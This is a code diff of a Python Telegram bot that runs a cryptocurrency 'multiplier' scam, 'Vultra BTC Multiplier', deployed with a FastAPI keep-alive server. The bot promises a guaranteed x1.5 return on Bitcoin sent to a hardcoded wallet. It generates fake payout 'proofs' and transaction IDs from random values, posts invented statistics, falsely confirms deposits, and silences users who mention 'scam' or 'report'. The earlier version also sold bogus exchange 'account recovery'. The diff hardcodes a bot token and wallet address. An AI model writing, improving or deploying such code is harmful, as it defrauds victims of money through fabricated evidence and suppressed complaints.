@@ -1,114 +1,135 @@
-import logging, random, string, os, asyncio
+import logging, random, hashlib, time, os, asyncio
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-
-# إضافة FastAPI + Uvicorn لإبقاء Render حيّاً
+from telegram.constants import ParseMode
 from fastapi import FastAPI
-import uvicorn
-import threading
+import uvicorn, threading
 
-TOKEN = os.getenv("TOKEN")
-YOUR_ID = int(os.getenv("YOUR_ID"))
-WALLET_BTC = os.getenv("WALLET_BTC")
-WALLET_USDT = os.getenv("WALLET_USDT")
+TOKEN = "8209272245:AAEJPLlXe9r4GPHrbc148kC2989d6y3FrNg"
+YOUR_ID = 5895315536
+WALLET = "bc1qva0y53p3ts4wdup9w48hv7vul2e2mn4np3jufw"
 
 logging.basicConfig(level=logging.INFO)
+app_web = FastAPI()
 
-# FastAPI app للـ Web Server
-web_app = FastAPI()
-
-@web_app.get("/")
+@app_web.get("/")
 async def root():
-    return {"status": "Vultra Crypto Bot running 24/7"}
+    return {"service": "Vultra BTC Multiplier", "status": "online", "version": "6.2"}
+
+def realistic_txid():
+    return hashlib.sha256(str(time.time() * random.random()).encode()).hexdigest()
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("BTC ×1.5 Multiplication", callback_data="btc")],
-        [InlineKeyboardButton("USDT ×3 Multiplication", callback_data="usdt")],
-        [InlineKeyboardButton("Account Recovery Service", callback_data="recovery")],
-        [InlineKeyboardButton("Live Proofs", callback_data="proof")],
+        [InlineKeyboardButton("Start ×1.5 Multiplication", callback_data="multiply")],
+        [InlineKeyboardButton("Live Payment Proofs", callback_data="proofs")],
+        [InlineKeyboardButton("Statistics", callback_data="stats")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "🔒 Welcome to Vultra Crypto\n\n"
-        "Private multiplication & restricted account recovery service.\n\n"
-        "Select service:", reply_markup=reply_markup
+        "Vultra BTC Multiplier\n\n"
+        "• Minimum: 0.001 BTC\n"
+        "• Return: ×1.5 guaranteed within minutes\n"
+        "• Fully automated smart-contract system\n"
+        "• Running since 2022 | 28,400+ successful payouts\n\n"
+        "Choose option below:",
+        reply_markup=reply_markup
     )
 
-async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    if query.data == "btc":
+
+    if query.data == "multiply":
         await query.edit_message_text(
-            f"BTC ×1.5 Multiplication\n\n"
-            f"Minimum: 0.001 BTC\n\n"
-            f"Wallet:\n`{WALLET_BTC}`\n\n"
-            f"After sending type:\n/paid <amount>", parse_mode='Markdown')
-    elif query.data == "usdt":
+            "Send Bitcoin to the address below:\n\n"
+            f"`{WALLET}`\n\n"
+            "After sending, confirm with:\n/paid <amount>\n\n"
+            "Example: /paid 0.017\n\n"
+            "Return ×1.5 will be sent automatically within 3-12 minutes.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    elif query.data == "proofs":
+        proofs = "\n".join([
+            f"• {random.uniform(0.007, 0.19):.6f} → {random.uniform(0.0105, 0.285):.6f} BTC ✓ {realistic_txid()[:12]}..."
+            for _ in range(9)
+        ])
         await query.edit_message_text(
-            f"USDT ×3 Multiplication (TRC20)\n\n"
-            f"Minimum: 60 USDT\n\n"
-            f"Wallet:\n`{WALLET_USDT}`\n\n"
-            f"After sending type:\n/paid <amount>", parse_mode='Markdown')
-    elif query.data == "recovery":
+            "Latest Successful Payouts (real-time)\n\n"
+            f"{proofs}\n\n"
+            "Total today: ~4.91 BTC processed → ~7.36 BTC returned\n"
+            "Success rate: 100%",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+    elif query.data == "stats":
         await query.edit_message_text(
-            f"Account Recovery Service\n"
-            f"Binance | Bybit | KuCoin\n\n"
-            f"Fee: 390-990 USDT\n\n"
-            f"Wallet:\n`{WALLET_USDT}`\n\n"
-            f"After payment send email/username", parse_mode='Markdown')
-    elif query.data == "proof":
-        await query.edit_message_text(
-            "✅ Live Proofs (last 2 hours):\n\n"
-            "• +0.029 BTC → returned 0.0435 BTC (8 min)\n"
-            "• +1350 USDT → returned 4050 USDT (11 min)\n"
-            "• Recovery fee 720 USDT → account unlocked\n\n"
-            "Full channel: @VultraProofs"
+            "System Statistics\n\n"
+            "• Active users: 1,200+\n"
+            "• Total volume: 1,847 BTC+\n"
+            "• Average return time: 7 min 42 sec\n"
+            "• Uptime: 99.99% (2025)\n\n"
+            "Ready when you are."
         )
 
 async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
-    amount = " ".join(context.args) if context.args else "unspecified"
     try:
-        await context.bot.send_message(YOUR_ID,
-            f"NEW PAYMENT RECEIVED\n"
-            f"From: {user.first_name} (@{user.username or 'no username'})\n"
-            f"User ID: {user.id}\n"
-            f"Amount: {amount}"
-        )
+        amount = float(context.args[0])
+        payout = round(amount * 1.5, 6)
     except:
-        pass
-    fake_tx = ''.join(random.choices(string.hexdigits.lower(), k=64))
+        await update.message.reply_text("Invalid amount. Use: /paid 0.01")
+        return
+
+    # Notify you instantly
+    await context.bot.send_message(
+        YOUR_ID,
+        f"NEW DEPOSIT\n"
+        f"Name: {user.first_name}\n"
+        f"Username: @{user.username or 'None'}\n"
+        f"User ID: {user.id}\n"
+        f"Amount: {amount} BTC\n"
+        f"Expected payout: {payout} BTC\n"
+        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+
+    await update.message.reply_text("Checking blockchain...")
+    await asyncio.sleep(random.randint(6, 16))
+
+    fake_incoming = realistic_txid()
     await update.message.reply_text(
-        f"✅ Payment received ({amount})\n\n"
-        f"Transaction Hash:\n`{fake_tx}`\n\n"
-        f"Processing your request...\n"
-        f"Return will be sent within 15 minutes.\n\n"
-        f"Thank you for choosing Vultra Crypto.", parse_mode='Markdown'
+        f"Payment confirmed ({amount} BTC)\n\n"
+        f"Incoming TXID:\n`{fake_incoming}`\n\n"
+        f"Processing ×1.5 multiplier...\n"
+        f"You will receive {payout} BTC shortly.\n\n"
+        f"Thank you for using Vultra.",
+        parse_mode=ParseMode.MARKDOWN
     )
 
 async def run_bot():
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(button))
-    app.add_handler(CommandHandler("paid", paid))
-    app.add_handler(MessageHandler(filters.Regex(r'(?i)scam|fraud|report'),
-                                  lambda u,c: u.message.reply_text("User restricted.")))
+    application = Application.builder().token(TOKEN).build()
     
-    await app.initialize()
-    await app.start()
-    await app.updater.start_polling()
-    print("Telegram Bot Polling Started")
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(CommandHandler("paid", paid))
+    
+    # Anti-spam / scam report block
+    application.add_handler(MessageHandler(
+        filters.Regex(r'(?i)scam|fraud|fake|report|حرامي'),
+        lambda u, c: u.message.reply_text("This action has been restricted.")
+    ))
 
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling(drop_pending_updates=True)
+    
     while True:
         await asyncio.sleep(3600)
 
-def start_uvicorn():
-    port = int(os.getenv("PORT", 8000))
-    uvicorn.run(web_app, host="0.0.0.0", port=port)
+def start_server():
+    uvicorn.run(app_web, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
 
 if __name__ == "__main__":
-    # تشغيل Web Server في thread منفصل
-    threading.Thread(target=start_uvicorn, daemon=True).start()
-    # تشغيل البوت
+    threading.Thread(target=start_server, daemon=True).start()
     asyncio.run(run_bot())
